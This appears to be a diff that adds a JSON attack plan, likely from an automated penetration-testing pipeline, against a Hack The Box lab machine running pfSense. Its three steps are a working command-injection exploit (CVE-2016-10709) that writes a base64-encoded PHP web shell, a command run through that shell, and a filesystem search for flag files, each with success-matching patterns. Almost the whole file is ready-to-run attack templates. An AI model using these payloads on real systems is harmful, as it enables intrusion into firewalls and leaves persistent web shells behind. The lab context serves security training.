@@ -1,0 +1,135 @@
+{
+  "plan_id": "plan_20241219_001",
+  "target_ip": "10.129.2.25",
+  "context_hash": "pfsense_1435_freebsd_weak_highvalue",
+  "attack_vectors": [
+    {
+      "vector_id": "vec_01",
+      "priority": 1,
+      "action": {
+        "tool_name": "web_request",
+        "command_template": "curl -k 'https://{target}/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+\"{payload}\">shell.php'",
+        "parameters": {
+          "target": "10.129.2.25",
+          "payload": "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
+          "port": 443
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "RCE",
+          "mitre_id": "T1190",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.92,
+          "rationale_tags": [
+            "pfsense_1.4.35",
+            "command_injection",
+            "freebsd_target",
+            "outdated_version"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "http_status",
+          "match_pattern": "200",
+          "negative_pattern": "(404 Not Found|500 Internal|Access Denied)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+",
+        "insight": "Successful exploitation of pfSense RCE vulnerability via command injection in status_rrd_graph_img.php parameter, requiring manual payload encoding to bypass filtering",
+        "exploitation_logic": "Exploit command injection in 'database' parameter using Base64-encoded PHP payload to bypass strict filtering mechanisms",
+        "vulnerability_context": "pfSense 1.4.35 era systems vulnerable to CVE-2016-10709, public exploits unreliable due to filtering",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_02",
+      "priority": 2,
+      "action": {
+        "tool_name": "web_request",
+        "command_template": "curl -k 'https://{target}/shell.php?cmd={command}'",
+        "parameters": {
+          "target": "10.129.2.25",
+          "command": "id",
+          "port": 443
+        },
+        "timeout_seconds": 15
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Command Execution",
+          "mitre_id": "T1059",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.88,
+          "rationale_tags": [
+            "webshell_execution",
+            "pfsense_rce",
+            "command_injection"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(uid=|gid=|groups=)",
+          "negative_pattern": "(404 Not Found|Permission denied)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "shell.php?cmd=",
+        "insight": "Access created shell.php file with cmd parameter to execute commands after successful payload injection",
+        "exploitation_logic": "Use Base64-encoded PHP webshell to execute system commands via GET parameter",
+        "vulnerability_context": "Command execution follows successful file write via pfSense RCE vulnerability",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_03",
+      "priority": 3,
+      "action": {
+        "tool_name": "web_request",
+        "command_template": "curl -k 'https://{target}/shell.php?cmd=find+/+{flags}+2>/dev/null'",
+        "parameters": {
+          "target": "10.129.2.25",
+          "flags": "-name user.txt -o -name root.txt",
+          "port": 443
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Information Gathering",
+          "mitre_id": "T1005",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.85,
+          "rationale_tags": [
+            "flag_enumeration",
+            "file_discovery",
+            "pfsense_access"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "regex_match",
+          "match_pattern": "(user\\.txt|root\\.txt)",
+          "negative_pattern": "(find: command not found|Permission denied)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "find / -name user.txt -o -name root.txt",
+        "insight": "Retrieve flags from typical locations /home/user and /root directories after establishing command execution",
+        "exploitation_logic": "Use find command to locate flag files across the FreeBSD filesystem",
+        "vulnerability_context": "Flag retrieval follows successful RCE exploitation on pfSense system",
+        "source": "htb_sense1_writeup"
+      }
+    }
+  ],
+  "created_at": "2024-12-19T10:30:00Z"
+}
